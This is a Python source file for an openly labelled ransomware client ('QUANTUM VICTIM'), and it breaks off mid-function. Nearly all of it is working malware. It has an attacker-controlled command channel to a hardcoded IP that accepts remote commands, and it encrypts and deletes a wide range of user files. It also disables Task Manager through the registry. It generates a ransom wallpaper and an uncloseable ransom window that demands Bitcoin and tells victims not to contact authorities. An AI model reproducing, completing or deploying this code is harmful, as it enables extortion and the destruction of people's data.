#!/usr/bin/env python3
"""
QUANTUM VICTIM v4.1 - FIXED CONNECTION HANDLING
RSA/AES Encryption Client with stable socket management
"""

import socket
import sys
import time
import os
import json
import struct
import hashlib
import secrets
import subprocess
import threading
import platform
import traceback
import select

# Windows constants for subprocess
if platform.system() == "Windows":
    SW_SHOWNORMAL = 1
    SW_HIDE = 0
    CREATE_NO_WINDOW = 0x08000000
    CREATE_NEW_CONSOLE = 0x00000010
else:
    SW_SHOWNORMAL = None
    SW_HIDE = None
    CREATE_NO_WINDOW = 0
    CREATE_NEW_CONSOLE = 0

# Try to import crypto libraries
try:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import AES, PKCS1_OAEP
    from Cryptodome.Random import get_random_bytes
    from Cryptodome.Util.Padding import pad, unpad

    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[VICTIM] PyCryptodome not available, using fallback encryption")


class EncryptionEngine:
    """Hybrid RSA/AES Encryption Engine"""

    def __init__(self):
        self.public_key = None
        self.private_key = None
        self.encrypted_extension = ".MrRobot"
        self.crypto_available = CRYPTO_AVAILABLE
        self.interface_open = False
        self.interface_process = None
        self.wallpaper_process = None
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        print(f"[ENCRYPTION] Crypto available: {self.crypto_available}")

    def load_public_key(self, public_key_pem):
        """Load RSA public key from PEM string"""
        if not self.crypto_available:
            return False
        try:
            if '\\n' in public_key_pem:
                public_key_pem = public_key_pem.replace('\\n', '\n')
            self.public_key = RSA.import_key(public_key_pem.strip())
            print("[ENCRYPTION] Public key loaded")
            return True
        except Exception as e:
            print(f"[ENCRYPTION] Failed to load public key: {e}")
            return False

    def load_private_key(self, private_key_pem):
        """Load RSA private key from PEM string"""
        if not self.crypto_available:
            return False
        try:
            if '\\n' in private_key_pem:
                private_key_pem = private_key_pem.replace('\\n', '\n')
            self.private_key = RSA.import_key(private_key_pem.strip())
            print("[ENCRYPTION] Private key loaded")
            return True
        except Exception as e:
            print(f"[ENCRYPTION] Failed to load private key: {e}")
            return False

    def encrypt_file_silent(self, file_path, delete_original=True):
        """Encrypt file"""
        if not self.crypto_available:
            return self._encrypt_fallback(file_path, delete_original)
        if not self.public_key:
            print("[ENCRYPTION] No public key loaded")
            return False
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            if len(file_data) == 0:
                return False

            aes_key = get_random_bytes(32)
            iv = get_random_bytes(16)
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher_aes.encrypt(padded_data)

            cipher_rsa = PKCS1_OAEP.new(self.public_key)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)

            header = struct.pack('!4s', b'MRRB')
            header += struct.pack('!H', 1)
            header += struct.pack('!I', len(encrypted_aes_key))
            header += struct.pack('!I', len(iv))
            header += struct.pack('!Q', len(file_data))

            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, 'wb') as f:
                f.write(header)
                f.write(encrypted_aes_key)
                f.write(iv)
                f.write(encrypted_data)

            if os.path.exists(encrypted_path) and os.path.getsize(encrypted_path) > 0:
                if delete_original:
                    try:
                        os.remove(file_path)
                    except:
                        pass
                return True
            return False
        except Exception as e:
            print(f"[ENCRYPTION] Encryption error for {file_path}: {e}")
            return False

    def _encrypt_fallback(self, file_path, delete_original=True):
        """Fallback XOR encryption"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            if len(data) == 0:
                return False

            key = secrets.token_bytes(32)
            key_len = len(key)
            encrypted = bytearray(data)
            for i in range(len(encrypted)):
                encrypted[i] ^= key[i % key_len]

            header = struct.pack('!4s', b'FALL')
            header += struct.pack('!H', 1)
            header += struct.pack('!I', len(key))
            header += struct.pack('!Q', len(data))

            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, 'wb') as f:
                f.write(header)
                f.write(key)
                f.write(encrypted)

            if delete_original and os.path.exists(encrypted_path):
                os.remove(file_path)
                return True
            return False
        except Exception as e:
            print(f"[ENCRYPTION] Fallback encryption error: {e}")
            return False

    def decrypt_file(self, encrypted_path):
        """Decrypt file"""
        if not self.crypto_available:
            return self._decrypt_fallback(encrypted_path)
        if not self.private_key:
            return False
        if not encrypted_path.endswith(self.encrypted_extension):
            return False
        try:
            with open(encrypted_path, 'rb') as f:
                magic = f.read(4)
                if magic != b'MRRB':
                    return False
                version = struct.unpack('!H', f.read(2))[0]
                aes_key_size = struct.unpack('!I', f.read(4))[0]
                iv_size = struct.unpack('!I', f.read(4))[0]
                original_size = struct.unpack('!Q', f.read(8))[0]
                encrypted_aes_key = f.read(aes_key_size)
                iv = f.read(iv_size)
                encrypted_data = f.read()

            cipher_rsa = PKCS1_OAEP.new(self.private_key)
            aes_key = cipher_rsa.decrypt(encrypted_aes_key)
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
            padded_data = cipher_aes.decrypt(encrypted_data)
            file_data = unpad(padded_data, AES.block_size)

            if len(file_data) != original_size:
                return False

            original_path = encrypted_path.replace(self.encrypted_extension, '')
            with open(original_path, 'wb') as f:
                f.write(file_data)
            os.remove(encrypted_path)
            return True
        except Exception as e:
            print(f"[ENCRYPTION] Decryption error: {e}")
            return False

    def _decrypt_fallback(self, encrypted_path):
        """Fallback XOR decryption"""
        if not encrypted_path.endswith(self.encrypted_extension):
            return False
        try:
            with open(encrypted_path, 'rb') as f:
                magic = f.read(4)
                if magic != b'FALL':
                    return False
                version = struct.unpack('!H', f.read(2))[0]
                key_size = struct.unpack('!I', f.read(4))[0]
                original_size = struct.unpack('!Q', f.read(8))[0]
                key = f.read(key_size)
                encrypted = f.read()

            key_len = len(key)
            decrypted = bytearray(encrypted)
            for i in range(len(decrypted)):
                decrypted[i] ^= key[i % key_len]

            if len(decrypted) != original_size:
                return False

            original_path = encrypted_path.replace(self.encrypted_extension, '')
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            os.remove(encrypted_path)
            return True
        except Exception as e:
            print(f"[ENCRYPTION] Fallback decryption error: {e}")
            return False

    def launch_wallpaper_and_disable_task_manager(self):
        """Launch wallpaper.py and disable task manager"""
        try:
            print("[WALLPAPER] Launching wallpaper.py...")
            wallpaper_path = os.path.join(self.script_dir, "wallpaper.py")
            
            if not os.path.exists(wallpaper_path):
                print("[WALLPAPER] wallpaper.py not found, creating it...")
                self._create_wallpaper_file()
            
            if not os.path.exists(wallpaper_path):
                print("[WALLPAPER] Failed to create wallpaper file")
                return False
            
            print(f"[WALLPAPER] Using wallpaper file: {wallpaper_path}")
            python_exe = sys.executable
            
            if platform.system() == "Windows":
                self.wallpaper_process = subprocess.Popen(
                    [python_exe, wallpaper_path],
                    cwd=self.script_dir,
                    creationflags=CREATE_NO_WINDOW
                )
                
                # Disable Task Manager on Windows
                print("[WALLPAPER] Disabling Task Manager...")
                try:
                    # Method 1: Registry method
                    reg_cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
                    subprocess.run(reg_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
                    
                    # Method 2: Group Policy method (if available)
                    gpedit_cmd = 'gpupdate /force'
                    subprocess.run(gpedit_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
                    
                    print("[WALLPAPER] Task Manager disabled successfully")
                except Exception as e:
                    print(f"[WALLPAPER] Error disabling Task Manager: {e}")
            else:
                self.wallpaper_process = subprocess.Popen(
                    [python_exe, wallpaper_path],
                    cwd=self.script_dir
                )
            
            time.sleep(2)
            
            if self.wallpaper_process.poll() is None:
                print("[WALLPAPER] Wallpaper launched successfully")
                return True
            else:
                print("[WALLPAPER] Wallpaper process failed to start")
                return False
                
        except Exception as e:
            print(f"[WALLPAPER] Failed to launch wallpaper: {e}")
            traceback.print_exc()
            return False

    def _create_wallpaper_file(self):
        """Create wallpaper.py file if it doesn't exist"""
        try:
            wallpaper_code = '''#!/usr/bin/env python3
"""
Ransomware Wallpaper Display
Sets a ransom note as desktop wallpaper
"""
import os
import sys
import time
import platform

def set_windows_wallpaper(image_path):
    """Set wallpaper on Windows"""
    try:
        import ctypes
        SPI_SETDESKWALLPAPER = 0x0014
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDWININICHANGE = 0x02
        
        if not os.path.exists(image_path):
            # Create a ransom note image
            create_ransom_image(image_path)
        
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 
            0, 
            image_path,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
        )
        return True
    except Exception as e:
        print(f"Windows wallpaper error: {e}")
        return False

def create_ransom_image(image_path):
    """Create a ransom note image"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        
        width, height = 1920, 1080
        image = Image.new('RGB', (width, height), color='black')
        draw = ImageDraw.Draw(image)
        
        # Try to load a font
        try:
            font = ImageFont.truetype("arial.ttf", 40)
        except:
            font = ImageFont.load_default()
        
        message = "YOUR FILES ARE ENCRYPTED\\n\\nALL IMPORTANT FILES HAVE BEEN ENCRYPTED\\n\\nTO RECOVER YOUR FILES, YOU MUST PAY A RANSOM\\n\\nDO NOT TRY TO DECRYPT FILES YOURSELF\\nDO NOT DELETE ENCRYPTED FILES\\n\\nTIME IS RUNNING OUT..."
        
        lines = message.split('\\\\n')
        y_position = 200
        for line in lines:
            text_width, text_height = draw.textsize(line, font=font)
            x_position = (width - text_width) // 2
            draw.text((x_position, y_position), line, fill='red', font=font)
            y_position += text_height + 20
        
        image.save(image_path)
        return True
    except Exception as e:
        print(f"Image creation error: {e}")
        return False

def main():
    """Main function"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        wallpaper_path = os.path.join(script_dir, "ransom_wallpaper.jpg")
        
        if platform.system() == "Windows":
            set_windows_wallpaper(wallpaper_path)
        elif platform.system() == "Darwin":  # macOS
            os.system(f'osascript -e \'tell application "Finder" to set desktop picture to POSIX file "{wallpaper_path}"\'')
        else:  # Linux
            # Try different desktop environments
            desktop = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()
            if 'gnome' in desktop:
                os.system(f'gsettings set org.gnome.desktop.background picture-uri "file://{wallpaper_path}"')
            elif 'kde' in desktop:
                os.system(f'qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript \'var allDesktops = desktops();for (i=0;i<allDesktops.length;i++) {{d = allDesktops[i];d.wallpaperPlugin = "org.kde.image";d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");d.writeConfig("Image", "file://{wallpaper_path}")}}\'')
        
        # Keep the script running
        while True:
            time.sleep(60)
            
    except Exception as e:
        print(f"Wallpaper error: {e}")
        time.sleep(30)

if __name__ == "__main__":
    main()
'''
            with open(os.path.join(self.script_dir, "wallpaper.py"), 'w') as f:
                f.write(wallpaper_code)
            print("[WALLPAPER] wallpaper.py created successfully")
            return True
        except Exception as e:
            print(f"[WALLPAPER] Failed to create wallpaper file: {e}")
            return False

    def disable_wallpaper_and_enable_task_manager(self):
        """Disable wallpaper and re-enable task manager"""
        try:
            print("[WALLPAPER] Stopping wallpaper...")
            
            # Stop wallpaper process
            if self.wallpaper_process:
                try:
                    self.wallpaper_process.terminate()
                    self.wallpaper_process.wait(timeout=3)
                except:
                    try:
                        self.wallpaper_process.kill()
                    except:
                        pass
                self.wallpaper_process = None
            
            # Re-enable Task Manager on Windows
            if platform.system() == "Windows":
                print("[WALLPAPER] Re-enabling Task Manager...")
                try:
                    # Method 1: Registry method
                    reg_cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
                    subprocess.run(reg_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
                    
                    # Method 2: Remove the registry key completely
                    reg_delete_cmd = 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f 2>nul'
                    subprocess.run(reg_delete_cmd, shell=True, creationflags=CREATE_NO_WINDOW, capture_output=True)
                    
                    # Method 3: Reset to default wallpaper
                    try:
                        import ctypes
                        SPI_SETDESKWALLPAPER = 0x0014
                        SPIF_UPDATEINIFILE = 0x01
                        SPIF_SENDWININICHANGE = 0x02
                        
                        # Set to solid color
                        ctypes.windll.user32.SystemParametersInfoW(
                            SPI_SETDESKWALLPAPER, 
                            0, 
                            "",
                            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
                        )
                    except:
                        pass
                    
                    print("[WALLPAPER] Task Manager re-enabled successfully")
                except Exception as e:
                    print(f"[WALLPAPER] Error re-enabling Task Manager: {e}")
            
            return True
            
        except Exception as e:
            print(f"[WALLPAPER] Error stopping wallpaper: {e}")
            return False

    def launch_interface_immediately(self):
        """Launch ransom interface IMMEDIATELY - BEFORE anything else"""
        try:
            if self.interface_open:
                print("[INTERFACE] Interface already open")
                return True

            print("[INTERFACE] Launching interface IMMEDIATELY...")
            interface_path = os.path.join(self.script_dir, "interface_integration.py")

            if not os.path.exists(interface_path):
                print("[INTERFACE] interface_integration.py not found, creating it...")
                self._create_interface_file()

            if not os.path.exists(interface_path):
                print("[INTERFACE] Failed to create interface file")
                return False

            print(f"[INTERFACE] Using interface file: {interface_path}")
            python_exe = sys.executable
            cmd = f'"{python_exe}" "{interface_path}"'
            print(f"[INTERFACE] Command: {cmd}")

            if platform.system() == "Windows":
                self.interface_process = subprocess.Popen(
                    [python_exe, interface_path],
                    cwd=self.script_dir,
                    creationflags=CREATE_NO_WINDOW
                )
            else:
                self.interface_process = subprocess.Popen(
                    [python_exe, interface_path],
                    cwd=self.script_dir
                )

            time.sleep(2)

            if self.interface_process.poll() is None:
                self.interface_open = True
                print("[INTERFACE] Interface launched successfully")
                return True
            else:
                print("[INTERFACE] First method failed, trying alternative...")
                return self._launch_interface_alternative()

        except Exception as e:
            print(f"[INTERFACE] Failed to launch interface: {e}")
            traceback.print_exc()
            return False

    def _create_interface_file(self):
        """Create interface_integration.py file"""
        try:
            interface_code = '''#!/usr/bin/env python3
"""
Simple Ransom Interface - Auto-generated
"""
import tkinter as tk
from tkinter import messagebox
import time

class RansomInterface:
    def __init__(self, root):
        self.root = root
        self.root.title("YOUR FILES ARE ENCRYPTED")
        self.root.geometry("800x600")
        self.root.resizable(False, False)
        self.root.configure(bg="black")
        self.root.attributes('-topmost', True)
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)

        tk.Label(root, text="⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️", 
                font=("Arial", 24, "bold"), fg="red", bg="black").pack(pady=30)

        message = """ALL YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED!
• Documents: ENCRYPTED
• Photos: ENCRYPTED  
• Videos: ENCRYPTED
• Databases: ENCRYPTED
• Backups: ENCRYPTED

Your files are now inaccessible.
To recover your files, you MUST pay a ransom.

DO NOT:
• Try to decrypt files yourself
• Delete encrypted files
• Restart your computer
• Contact authorities

The decryption key will be permanently deleted 
if payment is not made within 24 hours."""

        tk.Label(root, text=message, font=("Arial", 14), 
                fg="white", bg="black", justify="left").pack(pady=20)

        self.time_left = 86400
        self.timer_label = tk.Label(root, text="", 
                                   font=("Arial", 36, "bold"), 
                                   fg="red", bg="black")
        self.timer_label.pack(pady=20)
        self.update_timer()

        tk.Button(root, text="PAY RANSOM TO RECOVER FILES", 
                 command=self.show_payment,
                 font=("Arial", 18, "bold"),
                 bg="red", fg="white",
                 height=2, width=30).pack(pady=30)

        self.root.focus_force()

    def disable_close(self):
        messagebox.showerror("ACCESS DENIED", 
                           "You cannot close this window.\nPayment is required to remove this warning.")

    def show_payment(self):
        payment_window = tk.Toplevel(self.root)
        payment_window.title("Payment Instructions")
        payment_window.geometry("600x400")
        payment_window.configure(bg="black")

        tk.Label(payment_window, text="PAYMENT INSTRUCTIONS", 
                font=("Arial", 20, "bold"), fg="red", bg="black").pack(pady=20)

        instructions = """Send 0.05 BTC (≈ $1,500 USD) to:

BTC Address: 
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, contact the attacker 
with your victim ID to receive 
the decryption key.

Victim ID: VICTIM-ENCRYPTED"""

        tk.Label(payment_window, text=instructions, 
                font=("Courier", 12), 
                fg="white", bg="black",
                justify="left").pack(pady=20)

        tk.Button(payment_window, text="CLOSE", 
                 command=payment_window.destroy,
                 font=("Arial", 14),
                 bg="gray", fg="white").pack(pady=20)

    def update_timer(self):
        hours = self.time_left // 3600
        minutes = (self.time_left % 3600) // 60
        seconds = self.time_left % 60
        self.timer_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.time_left > 0:
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="TIME EXPIRED")

    def run(self):
        self.root.mainloop()

def start_interface():
    root = tk.Tk()
    app = RansomInterface(root)
    app.run()

if __name__ == "__main__":
    start_interface()
'''
            with open(os.path.join(self.script_dir, "interface_integration.py"), 'w') as f:
                f.write(interface_code)
            print("[INTERFACE] interface_integration.py created successfully")
            return True
        except Exception as e:
            print(f"[INTERFACE] Failed to create interface file: {e}")
            return False

    def _launch_interface_alternative(self):
        """Alternative interface launch method"""
        try:
            print("[INTERFACE] Using alternative launch method...")
            interface_path = os.path.join(self.script_dir, "interface_integration.py")

            if not os.path.exists(interface_path):
                print("[INTERFACE] No interface file for alternative launch")
                return False

            python_exe = sys.executable
            if platform.system() == "Windows":
                cmd = f'start /B "{python_exe}" "{interface_path}"'
            else:
                cmd = f'{python_exe} "{interface_path}" &'

            print(f"[INTERFACE] Alternative command: {cmd}")
            import os
            os.system(cmd)
            self.interface_open = True
            print("[INTERFACE] Alternative interface launch sent")
            return True
        except Exception as e:
            print(f"[INTERFACE] Alternative launch failed: {e}")
            return False

    def close_interface(self):
        """Close the ransom interface"""
        try:
            if not self.interface_open or not self.interface_process:
                return True
            print("[INTERFACE] Closing interface...")
            try:
                self.interface_process.terminate()
                self.interface_process.wait(timeout=3)
            except:
                try:
                    self.interface_process.kill()
                except:
                    pass
            self.interface_open = False
            self.interface_process = None
            print("[INTERFACE] Interface closed")
            return True
        except Exception as e:
            print(f"[INTERFACE] Error closing interface: {e}")
            return False


class QuantumVictim:
    """Main Victim Class - FIXED CONNECTION HANDLING"""

    def __init__(self, attacker_ip='192.168.44.133', attacker_port=5555):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.socket = None
        self.running = False
        self.victim_id = self._generate_id()
        self.connection_time = None
        self.encryption_engine = EncryptionEngine()
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.rtf', '.odt',
            '.xls', '.xlsx', '.csv', '.ods', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp3',
            '.mp4', '.avi', '.mkv', '.mov', '.wav', '.flac',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.py', '.java', '.cpp', '.c', '.js', '.html',
            '.css', '.php', '.xml', '.json', '.sql', '.db',
            '.ini', '.cfg', '.conf', '.config', '.yml', '.yaml',
            ''
        ]
        print(f"[VICTIM] Initialized with ID: {self.victim_id}")
        print(f"[VICTIM] Connecting to {attacker_ip}:{attacker_port}")

    def _generate_id(self):
        """Generate unique victim ID"""
        hostname = socket.gethostname()
        uid = hashlib.sha256(
            f"{hostname}{platform.node()}{os.getpid()}{time.time()}".encode()
        ).hexdigest()[:12]
        return f"VICTIM-{uid}"

    def _is_socket_alive(self, sock):
        """Check if socket is still connected"""
        try:
            sock.getpeername()
            ready_to_read, _, _ = select.select([sock], [], [], 0)
            if ready_to_read:
                data = sock.recv(1, socket.MSG_PEEK)
                if not data:
                    return False
            return True
        except:
            return False

    def connect(self):
        """Connect to attacker with retry logic"""
        print(f"[VICTIM] Attempting connection to {self.attacker_ip}:{self.attacker_port}")
        attempt = 1
        max_attempts = 15
        base_wait = 2

        while attempt <= max_attempts and not self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.attacker_ip, self.attacker_port))
                self.socket.settimeout(30)
                self.running = True
                self.connection_time = time.time()

                print(f"[VICTIM] Connected on attempt {attempt}")

                if self._perform_handshake():
                    print("[VICTIM] Handshake successful, entering main loop")
                    self._main_loop()
                else:
                    print("[VICTIM] Handshake failed")
                    self.running = False

            except socket.timeout:
                print(f"[VICTIM] Connection timeout (attempt {attempt}/{max_attempts})")
            except ConnectionRefusedError:
                print(f"[VICTIM] Connection refused (attempt {attempt}/{max_attempts})")
            except Exception as e:
                if "10061" in str(e) or "actively refused" in str(e):
                    print(f"[VICTIM] Connection refused (attempt {attempt}/{max_attempts})")
                else:
                    print(f"[VICTIM] Connection error: {e} (attempt {attempt}/{max_attempts})")

            if not self.running:
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    self.socket = None

                if attempt < max_attempts:
                    wait_time = min(base_wait * (2 ** (attempt - 1)), 60)
                    print(f"[VICTIM] Retrying in {wait_time} seconds...")
                    time.sleep(wait_time)

                attempt += 1

        if not self.running:
            print("[VICTIM] Failed to establish connection after all attempts")

    def _perform_handshake(self):
        """Perform handshake with attacker"""
        try:
            handshake = self._receive_json(timeout=15)
            if not handshake or handshake.get("type") != "handshake":
                print("[HANDSHAKE] Invalid handshake received")
                return False

            public_key_pem = handshake.get("public_key")
            if public_key_pem:
                self.encryption_engine.load_public_key(public_key_pem)

            admin_status = False
            if platform.system() == 'Windows':
                try:
                    import ctypes
                    admin_status = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except:
                    pass

            response = {
                "type": "handshake_response",
                "victim_id": self.victim_id,
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "admin_privileges": admin_status,
                "python_version": sys.version.split()[0],
                "crypto_available": self.encryption_engine.crypto_available,
                "encrypted_extension": ".MrRobot",
                "timestamp": time.time()
            }

            if not self._send_json(response):
                return False

            confirmation = self._receive_json(timeout=10)
            if confirmation and confirmation.get("type") == "session_confirmation":
                print("[HANDSHAKE] Session confirmed")
                return True
            return False

        except Exception as e:
            print(f"[HANDSHAKE] Error: {e}")
            return False

    def _send_json(self, data):
        """Send JSON data with length prefix"""
        try:
            if not self.socket:
                return False

            # Check socket before sending
            if not self._is_socket_alive(self.socket):
                print("[NETWORK] Socket dead, cannot send")
                return False

            json_str = json.dumps(data, ensure_ascii=False)
            encoded = json_str.encode('utf-8')
            length = len(encoded)

            self.socket.sendall(struct.pack('!I', length))
            self.socket.sendall(encoded)
            return True

        except (ConnectionResetError, ConnectionAbortedError):
            print("[NETWORK] Connection reset during send")
            return False
        except OSError as e:
            if hasattr(e, 'winerror') and e.winerror == 10054:
                print("[NETWORK] Connection forcibly closed by remote host")
            elif "10054" in str(e) or "forcibly closed" in str(e):
                print("[NETWORK] Connection forcibly closed by remote host")
            else:
                print(f"[NETWORK] Send error: {e}")
            return False
        except Exception as e:
            print(f"[NETWORK] Send error: {e}")
            return False

    def _receive_json(self, timeout=30):
        """Receive JSON data with length prefix - FIXED"""
        try:
            if not self.socket:
                return None

            self.socket.settimeout(timeout)

            # Read length prefix
            length_data = b''
            try:
                while len(length_data) < 4:
                    chunk = self.socket.recv(4 - len(length_data))
                    if not chunk:
                        print("[NETWORK] Connection closed by remote host")
                        return None
                    length_data += chunk
            except socket.timeout:
                return None
            except ConnectionResetError:
                print("[NETWORK] Connection reset by remote host")
                return None
            except ConnectionAbortedError:
                print("[NETWORK] Connection aborted")
                return None
            except OSError as e:
                if hasattr(e, 'winerror') and e.winerror == 10054:
                    print("[NETWORK] Connection forcibly closed by remote host")
                elif "10054" in str(e) or "forcibly closed" in str(e):
                    print("[NETWORK] Connection forcibly closed by remote host")
                else:
                    print(f"[NETWORK] Receive OSError: {e}")
                return None

            length = struct.unpack('!I', length_data)[0]

            if length > 10 * 1024 * 1024:
                return None

            data = b''
            bytes_received = 0
            while bytes_received < length:
                try:
                    chunk = self.socket.recv(min(4096, length - bytes_received))
                    if not chunk:
                        print("[NETWORK] Connection closed during data transfer")
                        return None
                    data += chunk
                    bytes_received += len(chunk)
                except socket.timeout:
                    return None
                except ConnectionResetError:
                    print("[NETWORK] Connection reset during data transfer")
                    return None
                except ConnectionAbortedError:
                    print("[NETWORK] Connection aborted during data transfer")
                    return None
                except OSError as e:
                    if hasattr(e, 'winerror') and e.winerror == 10054:
                        print("[NETWORK] Connection forcibly closed during data transfer")
                    elif "10054" in str(e) or "forcibly closed" in str(e):
                        print("[NETWORK] Connection forcibly closed during data transfer")
                    else:
                        print(f"[NETWORK] Data receive OSError: {e}")
                    return None

            try:
                decoded_data = data.decode('utf-8', errors='ignore')
                return json.loads(decoded_data)
            except json.JSONDecodeError:
                return None

        except socket.timeout:
            return None
        except Exception as e:
            # Only print unexpected errors
            if "10054" not in str(e) and "forcibly closed" not in str(e):
                print(f"[NETWORK] Receive error: {e}")
            return None

    def _main_loop(self):
        """Main communication loop - FIXED"""
        print("[VICTIM] Entering main command loop")
        last_activity = time.time()

        while self.running:
            try:
                # Check if socket is still alive
                if not self._is_socket_alive(self.socket):
                    print("[VICTIM] Socket connection lost")
                    break

                # Check inactivity timeout (5 minutes)
                if time.time() - last_activity > 300:
                    print("[VICTIM] Connection timeout due to inactivity")
                    break

                # Receive command with short timeout
                command = self._receive_json(timeout=2)

                if command is None:
                    # Timeout, continue loop
                    continue

                if command:
                    last_activity = time.time()
                    cmd_type = command.get("type", "unknown")
                    print(f"[VICTIM] Received command: {cmd_type}")
                    self._handle_command(command)

            except socket.timeout:
                continue
            except Exception as e:
                # Check for connection errors
                if "10054" in str(e) or "forcibly closed" in str(e):
                    print("[VICTIM] Connection forcibly closed by attacker")
                    break
                elif "Connection reset" in str(e):
                    print("[VICTIM] Connection reset by attacker")
                    break
                print(f"[VICTIM] Main loop error: {e}")
                break

        self.cleanup()

    def _handle_command(self, command):
        """Handle attacker commands"""
        cmd_type = command.get("type", "unknown")
        try:
            if cmd_type == "encrypt":
                self._handle_encryption_interface_first(command)
            elif cmd_type == "decrypt":
                self._handle_decryption(command)
            elif cmd_type == "scan":
                self._handle_scan(command)
            elif cmd_type == "status":
                self._handle_status(command)
            elif cmd_type == "command":
                self._execute_command(command)
            elif cmd_type == "heartbeat":
                pass
            else:
                error_response = {
                    "type": "error",
                    "error": f"Unknown command: {cmd_type}",
                    "timestamp": time.time()
                }
                self._send_json(error_response)
        except Exception as e:
            print(f"[VICTIM] Command error: {e}")
            error_response = {
                "type": "error",
                "error": str(e),
                "command": cmd_type,
                "timestamp": time.time()
            }
            self._send_json(error_response)

    def _handle_encryption_interface_first(self, command):
        """ENCRYPTION WITH INTERFACE FIRST"""
        location = command.get("location", "desktop")
        delete_original = command.get("delete_original", True)
        public_key_pem = command.get("public_key", None)
        print(f"[ENCRYPT_INTERFACE_FIRST] Starting: {location}")

        if public_key_pem:
            self.encryption_engine.load_public_key(public_key_pem)

        try:
            print("[ENCRYPT_INTERFACE_FIRST] STEP 1: Launching interface IMMEDIATELY...")
            interface_launched = self.encryption_engine.launch_interface_immediately()
            time.sleep(2)

            print("[ENCRYPT_INTERFACE_FIRST] STEP 1.5: Launching wallpaper and disabling Task Manager...")
            wallpaper_launched = self.encryption_engine.launch_wallpaper_and_disable_task_manager()
            time.sleep(2)

            print(f"[ENCRYPT_INTERFACE_FIRST] STEP 2: Finding files in {location}...")
            target_files = self._find_all_files(location)

            if not target_files:
                print(f"[ENCRYPT_INTERFACE_FIRST] No files found in {location}")
                response = {
                    "type": "encryption_result",
                    "success": False,
                    "error": "No files found",
                    "location": location,
                    "interface_launched": interface_launched,
                    "wallpaper_launched": wallpaper_launched,
                    "timestamp": time.time()
                }
                self._send_json(response)
                return

            print(f"[ENCRYPT_INTERFACE_FIRST] Found {len(target_files)} files")
            print("[ENCRYPT_INTERFACE_FIRST] STEP 3: Encrypting files (silent)...")
            encrypted_count = 0
            failed_count = 0

            batch_size = 50
            for i in range(0, len(target_files), batch_size):
                batch = target_files[i:i + batch_size]
                for filepath in batch:
                    try:
                        if self.encryption_engine.encrypt_file_silent(filepath, delete_original):
                            encrypted_count += 1
                        else:
                            failed_count += 1
                    except:
                        failed_count += 1
                time.sleep(0.1)

            print(f"[ENCRYPT_INTERFACE_FIRST] Encryption complete: {encrypted_count} encrypted, {failed_count} failed")

            result = {
                "type": "encryption_result",
                "success": encrypted_count > 0,
                "location": location,
                "encrypted_count": encrypted_count,
                "failed_count": failed_count,
                "total_files": len(target_files),
                "encryption_method": "rsa_aes" if self.encryption_engine.crypto_available else "fallback",
                "delete_original": delete_original,
                "interface_launched": interface_launched,
                "wallpaper_launched": wallpaper_launched,
                "interface_first": True,
                "timestamp": time.time()
            }

            if not self._send_json(result):
                print("[ENCRYPT_INTERFACE_FIRST] Failed to send result, connection may be lost")

            print(f"[ENCRYPT_INTERFACE_FIRST] Operation complete. Interface and wallpaper should be visible.")

        except Exception as e:
            print(f"[ENCRYPT_INTERFACE_FIRST] Error: {e}")
            error_response = {
                "type": "error",
                "error": str(e),
                "timestamp": time.time()
            }
            self._send_json(error_response)

    def _find_all_files(self, location):
        """Find ALL files in location"""
        target_files = []
        scan_dir = self._get_scan_dir(location)

        if not scan_dir or not os.path.exists(scan_dir):
            return target_files

        try:
            for root, dirs, files in os.walk(scan_dir):
                for filename in files:
                    if filename.endswith('.MrRobot'):
                        continue
                    filepath = os.path.join(root, filename)
                    try:
                        if os.path.getsize(filepath) > 100 * 1024 * 1024:
                            continue
                        _, ext = os.path.splitext(filename)
                        ext_lower = ext.lower()
                        if ext_lower in self.target_extensions or ext == '':
                            target_files.append(filepath)
                    except:
                        continue
        except Exception as e:
